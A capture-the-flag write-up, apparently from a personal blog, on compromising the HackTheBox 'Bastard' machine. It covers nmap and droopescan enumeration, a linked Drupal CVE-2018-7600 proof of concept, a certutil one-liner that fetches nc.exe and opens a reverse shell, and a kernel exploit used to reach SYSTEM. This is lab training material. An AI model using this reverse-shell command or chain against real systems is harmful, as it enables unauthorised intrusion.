---
layout: page
title: Bastard - HackTheBox
permalink: /posts/ctf/hackthebox/bastard.html
---

# Bastard - HackTheBox
----

First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 10.10.10.9`

![image](https://user-images.githubusercontent.com/50459517/109316892-b0262880-7811-11eb-9771-9817052562f6.png)

We have a few ports open but port 80 looks the most interesting.  Lets check it out.

![image](https://user-images.githubusercontent.com/50459517/109316932-b9af9080-7811-11eb-9e52-a28ac443c78b.png)

Looks like we have a Drupal page running, I like to run **doopescan** when I come across a Drupal site first but keep in mind the scan takes a while to finish.  I did some default passwords and basic enumeration while waiting but didn't find much so decided to wait for the results from **doopescan**

`droopescan scan drupal -u http://10.10.10.9`

![image](https://user-images.githubusercontent.com/50459517/109316957-c338f880-7811-11eb-8bb7-7defbaf4801a.png)

Now that we have a version, lets research and see if we can find a public exploit available.  I found an exploit for RCE in the Services module that I started to try however found another vulnerability in CVE-2018-7600 that seemed to be an easier path. Here is the Service module exploit.

[](https://www.exploit-db.com/exploits/41564)

Here is the PoC I used for CVE-2018-7600.  

[https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

Pretty straight forward exploit, Lets try it out.

![image](https://user-images.githubusercontent.com/50459517/109316992-cd5af700-7811-11eb-9bc0-e826f9cbf00c.png)

Looks like we have code execution!  Lets see if we can get a shell now.  I hosted up **nc.exe** and downloaded/executed it with this one liner to get a shell on the machine.

`certutil -urlcache -f [http://10.10.14.31/nc.exe](http://10.10.14.31/nc.exe) nc.exe & nc.exe -e cmd.exe 10.10.14.31 53`

![image](https://user-images.githubusercontent.com/50459517/109317012-d64bc880-7811-11eb-970b-5802dfbd5d4f.png)

![image](https://user-images.githubusercontent.com/50459517/109317029-de0b6d00-7811-11eb-9574-4e6da03539ad.png)

We are in.  I copied WinPEAS over but couldn't get the executable to run, probably a .NET issue.  I ran the .bat version but didn't find much so decided to run WinPrivChecker and found a number of possible kernel exploits.  I like abatchy17's GitHub collection of kernel exploits found here..

[https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)

![image](https://user-images.githubusercontent.com/50459517/109317053-e794d500-7811-11eb-9073-7a842cf70d9c.png)

I went through some of these and found that MS10-059.exe worked great for getting a reverse shell as System!

![image](https://user-images.githubusercontent.com/50459517/109317082-f11e3d00-7811-11eb-95bb-968dbf721bb1.png)

![image](https://user-images.githubusercontent.com/50459517/109317099-f8dde180-7811-11eb-8d41-4ce0566a8aee.png)
